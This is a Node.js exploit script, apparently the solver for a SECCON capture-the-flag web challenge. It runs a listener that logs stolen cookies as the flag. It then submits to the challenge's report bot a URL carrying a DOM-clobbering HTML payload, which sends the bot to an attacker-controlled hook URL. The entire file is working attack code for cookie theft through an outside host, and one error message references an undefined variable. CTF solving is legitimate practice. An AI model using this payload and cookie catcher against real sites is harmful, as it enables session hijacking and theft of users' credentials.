const fastify = require("fastify")();
const fetch = (...args) =>
  import("node-fetch").then(({ default: fetch }) => fetch(...args));

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_URL = process.env.SECCON_URL || fail("SECCON_URL not found");
const HOOK_URL = process.env.HOOK_URL || fail("HOOK_URL not found");

fastify.get("/", async (request, reply) => {
  const flag = request.query.cookie;
  console.log(flag); // Got flag!
  reply.send(flag);
});

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const report = async () => {
  const maxIter = 5;

  let iter = 0;
  while (iter++ < maxIter) {
    await sleep(5000);

    try {
      const pingRes = await fetch(HOOK_URL);
      if (pingRes.status !== 200) {
        throw new Error(`status code for ${HOOK_URL}: ${pingRes.status}`);
      }

      const view = `
        <form>
          <input id="form">
        </form>
        <a id="form" name="location" href="${HOOK_URL}"></a>
      `;

      const reportUrl = `http://web:3000/?window=form&view=${encodeURIComponent(
        view
      )}`;
      const body = new URLSearchParams();
      body.append("url", reportUrl);
      const reportRes = await fetch(`${SECCON_URL}/report`, {
        method: "POST",
        body,
      });
      if (reportRes.status !== 200) {
        throw new Error(`status code for ${url}: ${reportRes.status}`);
      }

      const text = await reportRes.text();
      console.log(text);
      break;
    } catch (e) {
      console.log(e);
    }
  }

  if (iter === maxIter) {
    fail("Failed to exploit");
  }
};

const start = async () => {
  try {
    const port = 8080;
    await fastify.listen(port, "0.0.0.0").then(async () => {
      console.log(`Listening at ${port}`);
      await report();
      await sleep(5 * 1000);
      process.exit(0);
    });
  } catch (err) {
    fastify.log.error(err);
    process.exit(1);
  }
};
start();
